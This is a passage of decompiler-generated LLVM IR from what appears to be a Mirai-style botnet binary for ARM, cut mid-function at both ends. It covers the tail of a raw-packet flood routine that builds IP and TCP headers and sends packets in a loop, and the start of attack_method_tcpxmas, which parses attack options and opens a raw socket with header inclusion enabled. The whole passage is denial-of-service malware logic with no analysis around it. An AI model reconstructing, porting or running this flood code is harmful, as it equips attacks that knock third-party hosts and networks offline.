  %v1_aa08 = phi i32 [ %v1_aadc, %dec_label_pc_aad0 ], [ %v1_a9fc, %dec_label_pc_a9f8 ]
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v9_aa08 = icmp eq i32 %v3_a7b0, %v1_aa08
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04, %dec_label_pc_aaf8
  %v0_aa10 = load i32, i32* @r4, align 4
  %v1_aa10 = add i32 %v0_aa10, 41
  store i32 %v1_aa10, i32* %r0.global-to-local, align 4
  store i32 %v4_aa14.pre-phi, i32* %r1.global-to-local, align 4
  %v2_aa18 = call i32 @rand_alpha_str(i32 %v1_aa10, i32 %v4_aa14.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa20 = load i32, i32* @r4, align 4
  %v3_aa20 = add i32 %v2_aa20, 10
  %v4_aa20 = inttoptr i32 %v3_aa20 to i16*
  store i16 0, i16* %v4_aa20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  %v2_aa2c = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa2c = trunc i32 %v2_aa2c to i16
  store i32 %v2_aa2c, i32* %r0.global-to-local, align 4
  %v3_aa30 = load i32, i32* @r4, align 4
  %v4_aa30 = add i32 %v3_aa30, 10
  %v5_aa30 = inttoptr i32 %v4_aa30 to i16*
  store i16 %v3_aa2c, i16* %v5_aa30, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_aa38 = load i32, i32* @r6, align 4
  %v3_aa38 = add i32 %v2_aa38, 6
  %v4_aa38 = inttoptr i32 %v3_aa38 to i16*
  store i16 0, i16* %v4_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v1_aa40 = add i32 %v0_aa3c, 4
  %v2_aa40 = inttoptr i32 %v1_aa40 to i16*
  %v3_aa40 = load i16, i16* %v2_aa40, align 2
  %v4_aa40 = zext i16 %v3_aa40 to i32
  store i32 %v4_aa40, i32* %r2.global-to-local, align 4
  %v0_aa44 = load i32, i32* @sb, align 4
  store i32 %v0_aa44, i32* %r3.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v4_aa4c = call i32 @checksum_tcpudp(i32 %v0_aa48, i32 %v0_aa3c, i32 %v4_aa40, i32 %v0_aa44)
  %v5_aa4c = trunc i32 %v4_aa4c to i16
  store i32 %v4_aa4c, i32* %r0.global-to-local, align 4
  %v3_aa50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa50, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa58 = mul i32 %v3_aa50, 32
  store i32 %v3_aa58, i32* %ip.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 6
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa4c, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp128
  store i32 %v5_aa60, i32* %ip.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @lr, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* %ip.global-to-local, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  %v0_aa70 = load i32, i32* @fp, align 4
  %v1_aa70 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa70 = add i32 %v1_aa70, 4
  %v3_aa70 = inttoptr i32 %v2_aa70 to i32*
  store i32 %v0_aa70, i32* %v3_aa70, align 4
  %v0_aa74 = load i32, i32* @r4, align 4
  store i32 %v0_aa74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v0_aa80 = load i32, i32* @sl, align 4
  store i32 %v0_aa80, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa88 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa90 = call i32 @__libc_sendto(i32 %v3_a728, i32 %v0_aa74, i32 %v0_aa80, i32 16384, i32 %v0_aa88, i32 16)
  %v3_aa94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa94, i32* %r3.global-to-local, align 4
  %v1_aa98 = add i32 %v3_aa94, 1
  store i32 %v1_aa98, i32* %r0.global-to-local, align 4
  %v0_aa9c = load i32, i32* @r8, align 4
  %v9_aa9c = icmp eq i32 %v0_aa9c, %v1_aa98
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa98, i32* %stack_var_-44, align 4
  %v8_aaa4 = icmp sgt i32 %v0_aa9c, %v1_aa98
  br i1 %v8_aaa4, label %dec_label_pc_a9cc, label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_aa10
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aaac = icmp eq i32 %v0_aa9c, 0
  store i1 %v2_aaac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aaac, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a9cc
  %v0_aabc = call i32 @rand_next()
  %v1_aabc = trunc i32 %v0_aabc to i16
  store i32 %v0_aabc, i32* %r0.global-to-local, align 4
  store i32 %v3_a78c, i32* @lr, align 4
  %v1_aac4 = load i32, i32* @r5, align 4
  %v9_aac4 = icmp eq i32 %v3_a78c, %v1_aac4
  store i1 %v9_aac4, i1* %cpsr_z.global-to-local, align 1
  %v3_aac8 = load i32, i32* @r4, align 4
  %v4_aac8 = add i32 %v3_aac8, 4
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v1_aabc, i16* %v5_aac8, align 2
  br i1 %v9_aac4, label %dec_label_pc_aad0, label %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge

dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge:    ; preds = %dec_label_pc_aabc
  %v1_a9fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9f8

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aabc, %dec_label_pc_a9ec
  %v0_aad0 = call i32 @rand_next()
  %v1_aad0 = trunc i32 %v0_aad0 to i16
  %v3_aad4 = load i32, i32* @r4, align 4
  %v4_aad4 = add i32 %v3_aad4, 20
  %v5_aad4 = inttoptr i32 %v4_aad4 to i16*
  store i16 %v1_aad0, i16* %v5_aad4, align 2
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v1_aadc = load i32, i32* @r5, align 4
  %v9_aadc = icmp eq i32 %v3_a7a8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aadc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aae4:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v0_aae4 = call i32 @rand_next()
  %v1_aae4 = trunc i32 %v0_aae4 to i16
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v1_aaec = load i32, i32* @r5, align 4
  %v9_aaec = icmp eq i32 %v3_a7b0, %v1_aaec
  store i1 %v9_aaec, i1* %cpsr_z.global-to-local, align 1
  %v3_aaf0 = load i32, i32* @r6, align 4
  %v4_aaf0 = add i32 %v3_aaf0, 2
  %v5_aaf0 = inttoptr i32 %v4_aaf0 to i16*
  store i16 %v1_aae4, i16* %v5_aaf0, align 2
  br i1 %v9_aaec, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04
  %v0_aaf8 = call i32 @rand_next()
  %v1_aaf8 = trunc i32 %v0_aaf8 to i16
  store i32 %v0_aaf8, i32* %r0.global-to-local, align 4
  %v3_aafc = load i32, i32* @r4, align 4
  %v4_aafc = add i32 %v3_aafc, 28
  %v5_aafc = inttoptr i32 %v4_aafc to i16*
  store i16 %v1_aaf8, i16* %v5_aafc, align 2
  br label %dec_label_pc_aa10

dec_label_pc_ab04:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a670, %dec_label_pc_a614, %entry
  %v0_ab04 = call i32 @rand_next()
  %v1_ab08 = urem i32 %v0_ab04, 4
  store i32 %v1_ab08, i32* %r0.global-to-local, align 4
  %v2_ab0c = icmp eq i32 %v1_ab08, 3
  store i1 %v2_ab0c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_ab04 to i2
  switch i2 %trunc, label %dec_label_pc_a70811 [
    i2 0, label %dec_label_pc_ab40
    i2 1, label %dec_label_pc_ab6c
    i2 -2, label %dec_label_pc_ab60
    i2 -1, label %dec_label_pc_ab50
  ]

dec_label_pc_ab28:                                ; preds = %dec_label_pc_a738
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v1_ab2c = call i32 @__GI___libc_close(i32 %v3_a728)
  store i32 %v1_ab2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a708, %dec_label_pc_ab28
  %v1_ab3c = phi i32 [ %v3_a728, %dec_label_pc_a710 ], [ %v1_ab3c49, %dec_label_pc_a708 ], [ %v1_ab2c, %dec_label_pc_ab28 ]
  store i32 %v18_a4c0, i32* %sb.global-to-local, align 4
  store i32 %v27_a4c0, i32* %lr.global-to-local, align 4
  ret i32 %v1_ab3c

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab04
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab04
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab04
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab04
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a708

; uselistorder directives
  uselistorder i32 %v1_ab08, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_ab04, { 1, 0 }
  uselistorder i32 %v0_aaf8, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_aadc, { 1, 0 }
  uselistorder i32 %v0_aabc, { 1, 0 }
  uselistorder i32 %v1_aa98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa4c, { 1, 0 }
  uselistorder i32 %v2_aa2c, { 1, 0 }
  uselistorder i1 %v3_a9f0, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i32 %v4_aa14.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a988, { 1, 0, 2 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a964, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a960, { 1, 0, 2 }
  uselistorder i32 %v0_a8d0, { 1, 0 }
  uselistorder i32 %v4_a8cc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a818, { 1, 0 }
  uselistorder i32 %v3_a7d4, { 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v3_a78c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a784, { 0, 2, 1 }
  uselistorder i8 %v5_a77c, { 1, 0, 2 }
  uselistorder i32 %v1_a768, { 1, 0 }
  uselistorder i32 %v0_a768, { 1, 0 }
  uselistorder i1 %v7_a758, { 1, 0 }
  uselistorder i1 %v7_a72c, { 1, 0 }
  uselistorder i32 %v3_a728, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a708, { 1, 0, 2 }
  uselistorder i32 %v2_a6d8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a6d4, { 1, 0, 2 }
  uselistorder i1 %v7_a6c4, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0, 2 }
  uselistorder i1 %v8_a6b8, { 1, 0 }
  uselistorder i1 %v7_a6b4, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i8 %v2_a69c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a6a0, { 1, 0 }
  uselistorder i32 %v0_a6c0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a690, { 0, 2, 1 }
  uselistorder i32 %v1_a6a4, { 0, 2, 1 }
  uselistorder i32 %v2_a678, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a670, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a668, { 1, 0 }
  uselistorder i32 %v0_a668, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a60c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a5ac, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a590, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a578, { 2, 1, 0 }
  uselistorder i32 %v1_a560, { 1, 0 }
  uselistorder i32 %v7_a51c, { 1, 0, 2 }
  uselistorder i32 %v2_a4e0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 26, 27, 28, 29, 30, 31, 32, 33, 1, 34, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r1.global-to-local, { 34, 35, 36, 37, 38, 1, 39, 40, 12, 13, 14, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 28, 27, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 38, 36, 37, 39, 41, 40, 43, 42, 44, 46, 45, 47, 48, 49, 51, 50, 53, 52, 54, 55, 56, 58, 57, 1, 2, 3, 7, 4, 5, 6, 8, 10, 9, 11, 12, 13, 14, 16, 15, 17, 18, 20, 19, 21, 23, 22, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 0, 25, 24, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i1* %cpsr_z.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 2, 3, 4, 5, 7, 8, 10, 11, 12, 9, 6, 13, 14, 15 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_a9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_a6c4, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a688, { 1, 0 }
}

define i32 @attack_method_tcpxmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab7c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab98 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_aba4 = load i32, i32* @r6, align 4
  store i32 %v0_aba4, i32* %r0.global-to-local, align 4
  %v2_aba8 = call i32 @calloc(i32 %v0_aba4, i32 4)
  %v0_abac = load i32, i32* @r5, align 4
  store i32 %v0_abac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_abbc = load i32, i32* @r4, align 4
  store i32 %v0_abbc, i32* %r0.global-to-local, align 4
  %v5_abc0 = inttoptr i32 %v0_abac to i32*
  %v6_abc0 = call i32 @attack_get_opt_int(i32 %v0_abbc, i32* %v5_abc0, i32 2, i32 0)
  %v1_abcc = urem i32 %v6_abc0, 256
  store i32 %v1_abcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r5, align 4
  store i32 %v0_abd8, i32* %r1.global-to-local, align 4
  %v0_abdc = load i32, i32* @r4, align 4
  store i32 %v0_abdc, i32* %r0.global-to-local, align 4
  %v5_abe0 = trunc i32 %v6_abc0 to i8
  %v6_abe4 = inttoptr i32 %v0_abd8 to i32*
  %v7_abe4 = call i32 @attack_get_opt_int(i32 %v0_abdc, i32* %v6_abe4, i32 3, i32 65535)
  %v0_abe8 = load i32, i32* @r5, align 4
  store i32 %v0_abe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_abe4, i32* @r7, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v4_abfc = inttoptr i32 %v0_abe8 to i32*
  %v5_abfc = call i32 @attack_get_opt_int(i32 %v0_abf8, i32* %v4_abfc, i32 4, i32 64)
  %v1_ac04 = urem i32 %v5_abfc, 256
  store i32 %v1_ac04, i32* %ip.global-to-local, align 4
  %v0_ac08 = load i32, i32* @r5, align 4
  store i32 %v0_ac08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v6_ac1c = inttoptr i32 %v0_ac08 to i32*
  %v7_ac1c = call i32 @attack_get_opt_int(i32 %v0_ac14, i32* %v6_ac1c, i32 5, i32 1)
  %v1_ac28 = urem i32 %v7_ac1c, 256
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ac30 = load i32, i32* @r5, align 4
  store i32 %v0_ac30, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ac38 = load i32, i32* @r4, align 4
  store i32 %v0_ac38, i32* %r0.global-to-local, align 4
  %v5_ac40 = inttoptr i32 %v0_ac30 to i32*
  %v6_ac40 = call i32 @attack_get_opt_int(i32 %v0_ac38, i32* %v5_ac40, i32 7, i32 65535)
  %v0_ac44 = load i32, i32* @r5, align 4
  store i32 %v0_ac44, i32* %r1.global-to-local, align 4
  %v3_ac48 = mul i32 %v6_ac40, 65536
  store i32 %v3_ac48, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v3_ac58 = urem i32 %v6_ac40, 65536
  store i32 %v3_ac58, i32* @sl, align 4
  %v4_ac5c = inttoptr i32 %v0_ac44 to i32*
  %v5_ac5c = call i32 @attack_get_opt_int(i32 %v0_ac54, i32* %v4_ac5c, i32 11, i32 1)
  %v1_ac64 = urem i32 %v5_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @attack_get_opt_int(i32 %v0_ac74, i32* %v5_ac7c, i32 12, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @attack_get_opt_int(i32 %v0_ac94, i32* %v5_ac9c, i32 13, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @attack_get_opt_int(i32 %v0_acb4, i32* %v5_acbc, i32 14, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_acc8 = load i32, i32* @r5, align 4
  store i32 %v0_acc8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acc8 to i32*
  %v6_acdc = call i32 @attack_get_opt_int(i32 %v0_acd4, i32* %v5_acdc, i32 15, i32 1)
  %v1_ace4 = urem i32 %v6_acdc, 256
  store i32 %v1_ace4, i32* %ip.global-to-local, align 4
  %v0_ace8 = load i32, i32* @r5, align 4
  store i32 %v0_ace8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r4, align 4
  store i32 %v0_acf4, i32* %r0.global-to-local, align 4
  %v5_acfc = inttoptr i32 %v0_ace8 to i32*
  %v6_acfc = call i32 @attack_get_opt_int(i32 %v0_acf4, i32* %v5_acfc, i32 16, i32 1)
  %v1_ad04 = urem i32 %v6_acfc, 256
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_ad10 = load i32, i32* @r5, align 4
  store i32 %v0_ad10, i32* %r1.global-to-local, align 4
  %v0_ad14 = load i32, i32* @r4, align 4
  store i32 %v0_ad14, i32* %r0.global-to-local, align 4
  %v5_ad1c = inttoptr i32 %v0_ad10 to i32*
  %v6_ad1c = call i32 @attack_get_opt_int(i32 %v0_ad14, i32* %v5_ad1c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ad2c = load i32, i32* @r5, align 4
  store i32 %v0_ad2c, i32* %r1.global-to-local, align 4
  %v0_ad30 = load i32, i32* @r4, align 4
  store i32 %v0_ad30, i32* %r0.global-to-local, align 4
  %v4_ad34 = inttoptr i32 %v0_ad2c to i32*
  %v5_ad34 = call i32 @attack_get_opt_int(i32 %v0_ad30, i32* %v4_ad34, i32 1, i32 1)
  %v1_ad3c = urem i32 %v5_ad34, 256
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad50 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ad50, i32* %r0.global-to-local, align 4
  %v7_ad54 = icmp eq i32 %v3_ad50, -1
  store i1 %v7_ad54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad50, i32* @sb, align 4
  br i1 %v7_ad54, label %dec_label_pc_af44, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad7c = call i32 @__GI_setsockopt(i32 %v3_ad50, i32 0, i32 3, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad7c, i32* %r0.global-to-local, align 4
  %v7_ad80 = icmp eq i32 %v5_ad7c, -1
  store i1 %v7_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad80, label %dec_label_pc_af3c, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad60
  %v0_ad88 = load i32, i32* @r7, align 4
  %v3_ad88 = mul i32 %v0_ad88, 65536
  store i32 %v3_ad88, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad90 = load i32, i32* @r6, align 4
  %v2_ad90 = icmp eq i32 %v0_ad90, 0
  store i1 %v2_ad90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad98 = urem i32 %v0_ad88, 65536
  store i32 %v3_ad98, i32* @fp, align 4
  br i1 %v2_ad90, label %dec_label_pc_b1c8, label %dec_label_pc_ada0.preheader

dec_label_pc_ada0.preheader:                      ; preds = %dec_label_pc_ad88
  %v2_adec = ptrtoint i32* %stack_var_-144 to i32
  %v2_ae30 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae68 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae74 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae78 = ptrtoint i32* %stack_var_-48 to i32
  %v4_aed8 = zext i8 %tmp to i32
  %v1_aedc = and i32 %v4_aed8, 18
  %v2_aee0 = icmp eq i32 %v1_aedc, 18
  %v4_b084 = sext i8 %v5_abe0 to i32
  %sext = mul i32 %v5_abfc, 16777216
  %v4_b094 = sdiv i32 %sext, 16777216
  %v3_aec4 = sext i16 %tmp61 to i32
  %v1_aee8 = and i32 %v4_aed8, 5
  %v2_aee8 = icmp eq i32 %v1_aee8, 0
  %v4_ae28 = add i32 %v2_adec, 82
  %v5_ae28 = inttoptr i32 %v4_ae28 to i16*
  %v1_b018 = add i32 %v6_ad1c, 40
  %v1_b12c = urem i32 %v5_ac5c, 2
  %tmp97 = sub nsw i32 0, %v1_b12c
  %v4_b134 = and i32 %tmp97, 32
  %v1_b144 = urem i32 %v6_ac7c, 2
  %tmp98 = sub nsw i32 0, %v1_b144
  %v4_b14c = and i32 %tmp98, 16
